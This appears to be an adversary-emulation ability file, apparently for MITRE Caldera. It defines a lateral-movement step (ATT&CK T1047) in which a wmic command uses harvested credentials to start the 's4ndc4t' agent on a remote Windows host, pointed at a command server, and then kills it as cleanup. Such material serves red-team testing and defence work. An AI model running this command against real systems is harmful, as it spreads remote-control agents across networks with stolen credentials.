- id: 103fb99c-3450-4b6d-a62d-dff09ce0f274
  name: Start 54ndc47 (WMI)
  description: Remotely executes 54ndc47 over WMI
  tactic: lateral-movement
  technique:
    attack_id: T1047
    name: Windows Management Instrumentation
  platforms:
    windows:
      psh:
        command: |
          wmic /node:`"#{remote.host.fqdn}`" /user:#{host.user.name} /password:#{host.user.password} process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group} -executors psh";
        cleanup: |
          wmic /node:`"#{remote.host.fqdn}`" /user:#{host.user.name} /password:#{host.user.password} process call create "taskkill /f /im s4ndc4t.exe"
  requires:
    - '#{host.user.name},has_password,#{host.user.password}'
